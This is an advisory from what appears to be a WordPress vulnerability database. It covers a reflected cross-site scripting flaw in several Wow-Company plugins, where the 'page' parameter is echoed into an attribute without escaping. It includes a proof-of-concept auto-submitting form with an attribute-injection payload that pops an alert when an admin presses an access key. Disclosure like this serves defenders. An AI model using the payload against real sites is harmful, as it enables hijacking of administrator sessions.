## WordPress Plugin Vulnerabilities

# Multiple Plugins from Wow-Company - Reflected XSS

### Description

The plugins do not escape the page parameter before outputting it back in an attribute, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin

### Proof of Concept

Make a logged in admin open a page with the code below
<html>
<body onload="document.forms[0].submit()">
<form action="https://example.com/wp-admin/admin.php?page=float-menu" method="POST">
<input type="hidden" name="page" value='"accesskey=X onclick=alert(/XSS/)//>' />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
The XSS will be triggered when pressing ALT+SHIFT+X on Windows and CTRL+ALT+X on OS X
